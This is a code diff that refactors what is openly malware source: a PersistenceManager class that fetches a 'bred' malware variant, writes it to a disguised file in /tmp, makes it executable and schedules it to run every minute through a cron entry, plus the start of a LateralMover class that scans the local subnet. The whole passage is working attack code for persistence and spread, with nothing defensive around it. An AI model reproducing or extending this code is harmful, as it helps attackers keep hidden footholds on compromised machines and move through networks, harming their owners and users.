@@ -100,25 +100,26 @@ class PersistenceManager:
             logging.error(f"Failed to fetch viral baby: {e}")
             return None
 
-    def install_viral_persistence(self):
-        """Installs a 'bred' malware variant as a persistence artifact."""
-        payload = self._fetch_viral_baby()
-        if not payload:
-            return False
-
+    def install_custom_payload(self, payload):
+        """Installs a specific payload string as a persistence artifact."""
         target_path = f"/tmp/system_update_{int(time.time())}.py"
         try:
             with open(target_path, "w") as f:
                 f.write(payload)
             os.chmod(target_path, 0o755)
 
-            # Add to cron
             with open("/tmp/malicious.cron", "a") as f:
                 f.write(f"* * * * * /usr/bin/python3 {target_path}\n")
 
             logging.info(f"Viral Persistence Installed: {target_path}")
             return True
         except: return False
+
+    def install_viral_persistence(self):
+        """Fetches and installs a bred variant."""
+        payload = self._fetch_viral_baby()
+        if payload: return self.install_custom_payload(payload)
+        return False
 
 class LateralMover:
     def scan_local_subnet(self):
